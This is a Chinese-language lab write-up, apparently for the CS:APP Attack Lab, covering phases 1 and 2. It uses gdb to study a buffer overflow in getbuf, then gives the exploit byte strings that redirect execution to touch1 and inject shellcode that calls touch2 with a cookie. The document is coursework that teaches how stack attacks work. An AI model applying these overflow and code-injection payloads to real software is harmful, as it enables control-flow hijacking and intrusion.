## phase 1

一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1

`gdb ctarget` 然后 `set args -q` 防止与不存在的服务器通信（`run -q` 也可以)
`b Gets` `run -q`

看一下栈信息: 
```
────────────────────────[ STACK ]────────────────────────
00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax
01:0008│ rdi 0x5561dc78 ◂— 0
... ↓        3 skipped
05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0
06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx
07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* 'hqi:' */
```

rsp 是当前栈顶指针，由于是在 Gets 的开头查看的，所以栈顶存的就是 Gets 的返回地址

思路应该是覆盖栈顶指针 `0x5561dc70` 处的
正确返回地址为 `touch1` 的地址`0x4017c0`

如何覆盖？看一下读入字符串的逻辑：

`_IO_getc@plt` 很明显是库函数 getchar()   
那附近是一个循环，如果是 -1 (`0x7ffffffff`) 就跳出，  
如果不是 0xA (经查表这个就是 ASCII 的行分隔符）就读入下一个 char

那就看一下读入单个字符的逻辑   
$rbx = $rdi, 推测 $rdi 作为 Gets() 的第一个参数就是存到的字符串地址   
也就是说 (%rdi) 应该就是我们输入的字符串存储地址的第一位
当然这里因为要调用 `_IO_getc` 并且 rdi 是调用者保存寄存器  
所以先用 rbx 存一下 rdi 

看了下 Gets 的 $rdi 存的是 `0x5561dc78`    
发现其实缓冲区不在 Gets() 的栈帧里(78 > 70, 栈内存向低地址增长）...

重新观察 `getbuf` 的汇编代码，发现 `sub $0x28, %rsp`，分配了 40 字节的缓冲区   
由于缓冲区栈溢出攻击的原理大概是这样：

```
// 注意这个栈是从高地址向低地址增加的

+------------------------+ 高地址
| caller 返回地址        | <- 函数返回时跳转的位置
+------------------------+
| buffer[40]             | <- callee 的栈帧
| buffer[39]             |
| ...                    | <- 缓冲区
| buffer[1]              |
| buffer[0]              | <- 缓冲区起始
+------------------------+ 低地址
```

所以只能向相对缓冲区更高的地址溢出，于是换个思路，在 getbuf 处 ret 到 touch1   
所以就不用考虑 Gets 的细节了，一共 40 字节的 buffer, 直接填充 40 个 `00`，  
然后填充 `c0 17 40` 即可(gdb 中在 getbuf 起始处看 %rsp 也能发现就是 `0x5561dca0 = 0x5561dc78 + 0x28` )

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

一个地址对应的通常是一字节，而一个十六进制的每个位数是 4 个二进制位 (1111=15=f)

两个十六进制位就是一字节。

由于只有网络协议相关会用大端法，所以这里是小端法，地址小的位置存的是低位

至于 `hex2raw` (Hexadecimal to Raw), 其实就是 `echo -n -e "\xc0\x17\x40"` 

## phase 2

要求将 `cookie.txt` 作为参数传递给 `touch2` 并调用

至此调用函数我们已经非常熟悉了，直接填充对应函数的地址到溢出后的位置即可。   
但是我们还需要传递参数，所以就不能再填充 `00` 了。   
这个 `ctarget` 编译时是关闭栈保护的，也就是说栈内存上的代码可以直接被执行。

编写 `phase2_inject.asm`:
```asm
mov      $0x59b997fa, %rdi
pushq    $0x4017ec
ret
```

其中，`0x59b997fa` 是 cookie，`0x4017ec` 是 `touch2` 的地址。    
当然这个是 AT&T 的语法，`nasm` 默认似乎是 Intel，所以我用 `as`

```shell
$ as phase2_inject.asm
$ objdump -d a.out

a.out:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3
```
于是得到了我们的 `inraw.txt`
```
48 c7 c7 fa 97 b9 59 90 
68 ec 17 40 00 90 90 90 
c3 00 00 00 00 00 00 00 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
78 dc 61 55 00 00 00 00
```

这里 90 是 `nop`, 用于填充的，不过似乎不需要?   
返回地址也直接覆盖为 `0x5561dc78`， 缓冲区开始的地方，也就是我们注入代码开始的地方   
还是要注意小端法。

(用时最短的一个，第一个做完第二个就轻车熟路了)

